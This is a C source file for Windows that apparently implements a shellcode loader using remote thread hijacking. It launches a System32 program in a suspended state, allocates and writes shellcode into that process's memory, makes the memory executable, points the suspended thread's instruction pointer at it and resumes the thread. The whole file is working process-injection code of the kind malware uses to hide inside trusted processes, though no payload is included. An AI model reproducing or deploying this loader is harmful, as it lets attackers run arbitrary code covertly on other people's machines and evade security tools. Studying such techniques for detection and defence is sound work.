
#include <Windows.h>
#include "tlhelp32.h"
#include <CL/cl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>




// Some macros to help in the process of writing and printing texts 
#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)


#define PAYLOAD_SIZE 1024


//Remote Thread hijacking tehnique


BOOL CreateSuspendedProcess(IN LPCSTR ProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR WnDr[MAX_PATH];
    CHAR lpPath[MAX_PATH * 2];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        warning("GetEnvironmentVariable failed, error: 0x%lx\n", GetLastError());
        return FALSE;
    }

    okay("We got the environment variable.\n");

    sprintf_s(lpPath, "%s\\System32\\%s", WnDr, ProcessName);
    info("Running: %s\n", lpPath);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
        warning("Failed to create process, error: 0x%lx\n", GetLastError());
        return FALSE;
    }

    info("Process created successfully.\n");

    *dwProcessId = pi.dwProcessId;
    *hProcess = pi.hProcess;
    *hThread = pi.hThread;

    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }
    return FALSE;
}


//Injection function
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        warning("VirtualAllocEx failed, error: %d\n", GetLastError());
        return FALSE;
    }

    info("Allocated memory at: 0x%p\n", *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        warning("WriteProcessMemory failed, error: %d\n", GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        warning("VirtualProtectEx failed, error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx;
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        warning("GetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

#ifdef _WIN64
    ThreadCtx.Rip = (DWORD64)pAddress;
#else
    ThreadCtx.Eip = (DWORD32)pAddress;
#endif

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        warning("SetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}
